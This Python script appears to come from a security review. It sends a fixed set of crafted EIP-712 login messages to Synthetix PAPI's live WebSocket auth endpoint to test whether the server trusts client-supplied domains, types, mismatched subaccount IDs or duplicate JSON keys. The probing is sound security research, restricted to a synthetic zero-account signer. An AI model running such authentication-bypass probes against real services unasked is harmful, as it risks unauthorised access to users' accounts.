#!/usr/bin/env python3
"""Controlled WebSocket AuthMessage parser/domain boundary probe for Synthetix PAPI.

Safety constraints:
- one deterministic synthetic EOA that owns/manages/delegates zero Synthetix accounts;
- one deliberately nonexistent valid-range subaccount ID;
- authentication attempts only; no subscribe, post, order, transfer, withdrawal, or mutation;
- fixed low-noise matrix and short delays;
- output retains response status/category and redacted messages only.

Goal: determine whether the WebSocket auth server verifies a fixed AuthMessage schema/domain,
or trusts the client-supplied `types`, `primaryType`, `domain`, and `message` JSON. Trusting
arbitrary typed data could turn unrelated public EIP-712 signatures into Synthetix login proofs.
"""
from __future__ import annotations

import asyncio
import hashlib
import json
import pathlib
import re
import time
import urllib.error
import urllib.request
from dataclasses import dataclass
from typing import Any, Callable

from eth_account import Account
from eth_account.messages import encode_typed_data
from websockets.asyncio.client import connect

OUT = pathlib.Path("ws_auth_parser_boundary")
OUT.mkdir(parents=True, exist_ok=True)

REST_INFO = "https://papi.synthetix.io/v1/info"
WS_TRADE = "wss://papi.synthetix.io/v1/ws/trade"
UA = "Mozilla/5.0 (compatible; authorized-synthetic-security-review/1.0)"
ACCOUNT = Account.from_key("0x" + "b7" * 32)
TARGET = 8_300_000_000_000_777
ZERO = "0x0000000000000000000000000000000000000000"
DEAD = "0x000000000000000000000000000000000000dEaD"
ADDRESS_RE = re.compile(r"0x[a-fA-F0-9]{40}")
HEX_RE = re.compile(r"0x[a-fA-F0-9]{64,}")
DOMAIN_FIELDS = [
    {"name": "name", "type": "string"},
    {"name": "version", "type": "string"},
    {"name": "chainId", "type": "uint256"},
    {"name": "verifyingContract", "type": "address"},
]
CANONICAL_DOMAIN = {"name": "Synthetix", "version": "1", "chainId": 1, "verifyingContract": ZERO}
CANONICAL_FIELDS = [
    {"name": "subAccountId", "type": "uint256"},
    {"name": "timestamp", "type": "uint256"},
    {"name": "action", "type": "string"},
]


def digest(value: str | bytes) -> str:
    if isinstance(value, str):
        value = value.encode()
    return hashlib.sha256(value).hexdigest()


def redact(value: Any) -> str | None:
    if value is None:
        return None
    text = str(value)
    text = ADDRESS_RE.sub("<address>", text)
    text = HEX_RE.sub("<hex>", text)
    text = re.sub(r"\b\d{10,}\b", "<large-number>", text)
    return text[:1000]


def post_json(url: str, payload: dict[str, Any]) -> tuple[int, Any]:
    body = json.dumps(payload, separators=(",", ":")).encode()
    req = urllib.request.Request(
        url,
        data=body,
        headers={"User-Agent": UA, "Content-Type": "application/json", "Accept": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=45) as response:
            raw = response.read(2 * 1024 * 1024)
            status = response.status
    except urllib.error.HTTPError as exc:
        raw = exc.read(2 * 1024 * 1024)
        status = exc.code
    try:
        return status, json.loads(raw)
    except Exception:
        return status, None


def account_count(response: Any) -> int | None:
    if isinstance(response, list):
        return len(response)
    if isinstance(response, dict):
        total = 0
        seen = False
        for key in ("subAccountIds", "delegatedSubAccountIds", "managedSubAccountIds"):
            value = response.get(key)
            if isinstance(value, list):
                seen = True
                total += len(value)
        return total if seen else None
    return None


def sign_typed(domain: dict[str, Any], primary: str, fields: list[dict[str, str]], message: dict[str, Any]) -> str:
    encoded = encode_typed_data(
        full_message={
            "types": {primary: fields},
            "primaryType": primary,
            "domain": domain,
            "message": message,
        }
    )
    signed = ACCOUNT.sign_message(encoded)
    return "0x" + format(signed.r, "064x") + format(signed.s, "064x") + format(signed.v, "02x")


def wire_payload(
    domain: dict[str, Any],
    primary: str,
    fields: list[dict[str, str]],
    message: dict[str, Any],
    *,
    hex_uints: bool = True,
) -> dict[str, Any]:
    wire_message: dict[str, Any] = dict(message)
    if hex_uints:
        for field in fields:
            name = field["name"]
            if field["type"] == "uint256" and isinstance(wire_message.get(name), int):
                wire_message[name] = hex(wire_message[name])
    return {
        "types": {"EIP712Domain": DOMAIN_FIELDS, primary: fields},
        "primaryType": primary,
        "domain": domain,
        "message": wire_message,
    }


@dataclass(frozen=True)
class Case:
    name: str
    build: Callable[[int], tuple[str, str]]


def standard_case(
    *,
    domain: dict[str, Any] = CANONICAL_DOMAIN,
    primary: str = "AuthMessage",
    fields: list[dict[str, str]] = CANONICAL_FIELDS,
    message_factory: Callable[[int], dict[str, Any]] | None = None,
    hex_uints: bool = True,
) -> Callable[[int], tuple[str, str]]:
    def build(now_ms: int) -> tuple[str, str]:
        message = (
            message_factory(now_ms)
            if message_factory
            else {"subAccountId": TARGET, "timestamp": now_ms, "action": "websocket_auth"}
        )
        signature = sign_typed(domain, primary, fields, message)
        payload = wire_payload(domain, primary, fields, message, hex_uints=hex_uints)
        return json.dumps(payload, separators=(",", ":")), signature

    return build


def altered_payload_negative(now_ms: int) -> tuple[str, str]:
    message = {"subAccountId": TARGET, "timestamp": now_ms, "action": "websocket_auth"}
    signature = sign_typed(CANONICAL_DOMAIN, "AuthMessage", CANONICAL_FIELDS, message)
    altered = dict(CANONICAL_DOMAIN)
    altered["name"] = "NotSynthetix"
    payload = wire_payload(altered, "AuthMessage", CANONICAL_FIELDS, message)
    return json.dumps(payload, separators=(",", ":")), signature


def account_substitution_negative(now_ms: int) -> tuple[str, str]:
    signed_message = {"subAccountId": TARGET, "timestamp": now_ms, "action": "websocket_auth"}
    signature = sign_typed(CANONICAL_DOMAIN, "AuthMessage", CANONICAL_FIELDS, signed_message)
    wire_message = {"subAccountId": TARGET + 1, "timestamp": now_ms, "action": "websocket_auth"}
    payload = wire_payload(CANONICAL_DOMAIN, "AuthMessage", CANONICAL_FIELDS, wire_message)
    return json.dumps(payload, separators=(",", ":")), signature


def duplicate_account_first_signed(now_ms: int) -> tuple[str, str]:
    message = {"subAccountId": TARGET, "timestamp": now_ms, "action": "websocket_auth"}
    signature = sign_typed(CANONICAL_DOMAIN, "AuthMessage", CANONICAL_FIELDS, message)
    types_json = json.dumps({"EIP712Domain": DOMAIN_FIELDS, "AuthMessage": CANONICAL_FIELDS}, separators=(",", ":"))
    domain_json = json.dumps(CANONICAL_DOMAIN, separators=(",", ":"))
    # The first value is signed; the second value tests duplicate-key parser handling.
    raw = (
        '{"types":' + types_json + ',"primaryType":"AuthMessage","domain":' + domain_json
        + ',"message":{"subAccountId":"' + hex(TARGET) + '","subAccountId":"' + hex(TARGET + 1)
        + '","timestamp":"' + hex(now_ms) + '","action":"websocket_auth"}}'
    )
    return raw, signature


CUSTOM_SAME_FIELDS = [
    {"name": "subAccountId", "type": "uint256"},
    {"name": "timestamp", "type": "uint256"},
    {"name": "action", "type": "string"},
]
EXTRA_FIELDS = CUSTOM_SAME_FIELDS + [{"name": "scope", "type": "string"}]
REORDERED_FIELDS = [
    {"name": "action", "type": "string"},
    {"name": "timestamp", "type": "uint256"},
    {"name": "subAccountId", "type": "uint256"},
]
SUBACTION_FIELDS = [
    {"name": "subAccountId", "type": "uint256"},
    {"name": "action", "type": "string"},
    {"name": "nonce", "type": "uint256"},
    {"name": "expiresAfter", "type": "uint256"},
]
PERMIT_FIELDS = [
    {"name": "owner", "type": "address"},
    {"name": "spender", "type": "address"},
    {"name": "value", "type": "uint256"},
    {"name": "nonce", "type": "uint256"},
    {"name": "deadline", "type": "uint256"},
    {"name": "subAccountId", "type": "uint256"},
]

CASES = [
    Case("canonical_hex", standard_case()),
    Case("canonical_decimal", standard_case(hex_uints=False)),
    Case("custom_domain_name", standard_case(domain={**CANONICAL_DOMAIN, "name": "NotSynthetix"})),
    Case("custom_domain_version", standard_case(domain={**CANONICAL_DOMAIN, "version": "999"})),
    Case("custom_chain", standard_case(domain={**CANONICAL_DOMAIN, "chainId": 31337})),
    Case("custom_verifying_contract", standard_case(domain={**CANONICAL_DOMAIN, "verifyingContract": DEAD})),
    Case("custom_primary_same_fields", standard_case(primary="PermitLikeAuth", fields=CUSTOM_SAME_FIELDS)),
    Case(
        "custom_primary_extra_scope",
        standard_case(
            primary="SessionAuthorization",
            fields=EXTRA_FIELDS,
            message_factory=lambda now: {
                "subAccountId": TARGET,
                "timestamp": now,
                "action": "websocket_auth",
                "scope": "unrelated-typed-data",
            },
        ),
    ),
    Case(
        "reordered_auth_fields",
        standard_case(
            fields=REORDERED_FIELDS,
            message_factory=lambda now: {"action": "websocket_auth", "timestamp": now, "subAccountId": TARGET},
        ),
    ),
    Case(
        "custom_action",
        standard_case(message_factory=lambda now: {"subAccountId": TARGET, "timestamp": now, "action": "login"}),
    ),
    Case(
        "old_timestamp",
        standard_case(message_factory=lambda now: {"subAccountId": TARGET, "timestamp": now - 86_400_000, "action": "websocket_auth"}),
    ),
    Case(
        "future_timestamp",
        standard_case(message_factory=lambda now: {"subAccountId": TARGET, "timestamp": now + 86_400_000, "action": "websocket_auth"}),
    ),
    Case(
        "generic_subaccount_action",
        standard_case(
            primary="SubAccountAction",
            fields=SUBACTION_FIELDS,
            message_factory=lambda now: {
                "subAccountId": TARGET,
                "action": "getPositions",
                "nonce": now,
                "expiresAfter": now + 60_000,
            },
        ),
    ),
    Case(
        "unrelated_permit_shape",
        standard_case(
            domain={"name": "UnrelatedToken", "version": "1", "chainId": 1, "verifyingContract": DEAD},
            primary="Permit",
            fields=PERMIT_FIELDS,
            message_factory=lambda now: {
                "owner": ACCOUNT.address,
                "spender": DEAD,
                "value": 1,
                "nonce": 0,
                "deadline": now + 60_000,
                "subAccountId": TARGET,
            },
        ),
    ),
    Case("altered_domain_without_resign", altered_payload_negative),
    Case("signed_wire_account_mismatch", account_substitution_negative),
    Case("duplicate_subaccount_key", duplicate_account_first_signed),
]


def response_summary(name: str, raw: str, elapsed: float) -> dict[str, Any]:
    try:
        parsed = json.loads(raw)
    except Exception:
        return {
            "name": name,
            "elapsedMs": round(elapsed * 1000, 2),
            "json": False,
            "rawSha256": digest(raw),
            "rawBytes": len(raw.encode()),
        }
    result = parsed.get("result") if isinstance(parsed, dict) else None
    error = parsed.get("error") if isinstance(parsed, dict) else None
    error_message = None
    error_code = None
    if isinstance(error, dict):
        error_message = error.get("message") or error.get("error")
        error_code = error.get("code")
    elif error is not None:
        error_message = error
    if isinstance(result, dict) and error_message is None:
        error_message = result.get("message") or result.get("error")
    status = parsed.get("status") if isinstance(parsed, dict) else None
    if status is None and isinstance(result, dict):
        status = result.get("status")
    text = str(error_message) if error_message is not None else ""
    return {
        "name": name,
        "elapsedMs": round(elapsed * 1000, 2),
        "json": True,
        "topLevelKeys": sorted(parsed.keys()) if isinstance(parsed, dict) else None,
        "status": status,
        "errorCode": error_code,
        "messageRedacted": redact(error_message),
        "messageSha256": digest(text) if text else None,
        "mentionsSyntheticSigner": ACCOUNT.address.lower() in text.lower(),
        "rawSha256": digest(raw),
        "rawBytes": len(raw.encode()),
    }


async def run_case(case: Case) -> dict[str, Any]:
    now_ms = int(time.time() * 1000)
    message_json, signature = case.build(now_ms)
    request = {
        "id": "1",
        "method": "auth",
        "params": {"message": message_json, "signature": signature},
    }
    started = time.monotonic()
    try:
        async with connect(
            WS_TRADE,
            additional_headers={"User-Agent": UA},
            open_timeout=20,
            close_timeout=5,
            ping_interval=None,
            max_size=2 * 1024 * 1024,
        ) as ws:
            await ws.send(json.dumps(request, separators=(",", ":")))
            raw = await asyncio.wait_for(ws.recv(), timeout=15)
    except Exception as exc:  # noqa: BLE001
        return {
            "name": case.name,
            "transportError": type(exc).__name__,
            "transportMessage": redact(exc),
            "elapsedMs": round((time.monotonic() - started) * 1000, 2),
        }
    return response_summary(case.name, str(raw), time.monotonic() - started)


async def main_async() -> None:
    status, preflight = post_json(
        REST_INFO,
        {"params": {"action": "getSubAccountIds", "walletAddress": ACCOUNT.address, "includeDelegations": True}},
    )
    response = preflight.get("response") if isinstance(preflight, dict) else None
    count = account_count(response)
    if status != 200 or count != 0:
        raise RuntimeError(f"Synthetic signer preflight failed: status={status}, accountCount={count}")

    results: list[dict[str, Any]] = []
    for index, case in enumerate(CASES):
        results.append(await run_case(case))
        if index + 1 < len(CASES):
            await asyncio.sleep(0.35)

    canonical = next((item for item in results if item.get("name") == "canonical_hex"), None)
    canonical_message_hash = canonical.get("messageSha256") if isinstance(canonical, dict) else None
    same_as_canonical = [
        item.get("name")
        for item in results
        if item.get("name") != "canonical_hex"
        and canonical_message_hash
        and item.get("messageSha256") == canonical_message_hash
        and item.get("status") == canonical.get("status")
    ]
    output = {
        "safety": "Synthetic zero-account signer; nonexistent account; auth only; no subscriptions or state changes.",
        "syntheticAddress": ACCOUNT.address,
        "syntheticAccountCount": count,
        "targetSubaccountIdSha256": digest(str(TARGET)),
        "caseCount": len(results),
        "canonical": canonical,
        "casesMatchingCanonicalAuthFailure": same_as_canonical,
        "results": results,
    }
    (OUT / "summary.json").write_text(json.dumps(output, indent=2, sort_keys=True), encoding="utf-8")
    print(
        json.dumps(
            {
                "caseCount": len(results),
                "canonical": canonical,
                "casesMatchingCanonicalAuthFailure": same_as_canonical,
                "statuses": {item.get("name"): item.get("status") for item in results},
            },
            indent=2,
        )
    )


if __name__ == "__main__":
    asyncio.run(main_async())
